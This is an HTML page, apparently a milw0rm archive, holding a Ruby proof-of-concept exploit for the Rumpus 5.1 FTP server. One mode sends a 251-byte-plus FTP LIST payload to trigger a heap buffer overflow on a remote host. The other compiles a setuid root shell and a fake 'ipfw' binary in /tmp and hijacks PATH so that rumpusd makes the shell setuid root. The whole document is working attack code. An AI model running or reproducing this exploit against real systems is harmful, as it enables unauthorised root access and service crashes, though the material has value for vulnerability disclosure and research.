<html><head><title>Rumpus 5.1 Local Privilege Escalation / Remote FTP LIST PoC Exploit</title></head><pre>#!/usr/bin/ruby
# Copyright (c) Lance M. Havok  &lt;lmh [at] info-pull.com&gt;
#               Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
#
# Proof of concept for issues described in MOAB-18-01-2007.

require 'net/ftp'
require 'socket'

bugselected = (ARGV[0] || 0).to_i
target_host = (ARGV[1] || &quot;localhost&quot;)
target_user = (ARGV[2] || &quot;anonymous&quot;)
target_pass = (ARGV[3] || &quot;rumproast&quot;)

def list_bug(o)
  payload =   &quot;A&quot; * 251
  payload &lt;&lt;  [0x41424344].pack(&quot;V&quot;)
  payload &lt;&lt;  [0x61626364].pack(&quot;V&quot;)
  payload &lt;&lt;  [0x30313233].pack(&quot;V&quot;)
  payload &lt;&lt;  [0xdeadface].pack(&quot;V&quot;)
  o.list(payload)
end

def local_priv_escalation()
  wrapper   = 'int main() { setuid(0); setgid(0); system(&quot;/bin/sh -i&quot;); return 0; }'
  fake_ipfw = 'int main() { system(&quot;/usr/sbin/chown root: /tmp/shX; /bin/chmod 4755 /tmp/shX&quot;); return 0; }'
  command_line =  &quot;echo '#{wrapper}' &gt; /tmp/test.c &amp;&amp; cc -o /tmp/shX /tmp/test.c &amp;&amp; &quot;    +
                  &quot;echo '#{fake_ipfw}' &gt; /tmp/ipfw.c &amp;&amp; cc -o /tmp/ipfw /tmp/ipfw.c &amp;&amp; &quot; +
                  'export PATH=&quot;/tmp/:$PATH&quot; &amp;&amp; /usr/local/Rumpus/rumpusd'
  system command_line
  sleep 1
  puts &quot;++ Enjoy root shell...&quot;
  system &quot;/tmp/shX&quot;
end

case bugselected
  when 0
    puts &quot;++ FTP LIST heap buffer overflow...&quot;
    Net::FTP.open(target_host) do |ftp|
      ftp.login(&quot;#{target_user}&quot;,&quot;#{target_pass}&quot;)
      list_bug(ftp)
    end
  when 1
    puts &quot;++ Local privilege escalation...&quot;
    local_priv_escalation()
end

# milw0rm.com [2007-01-19]</pre></html>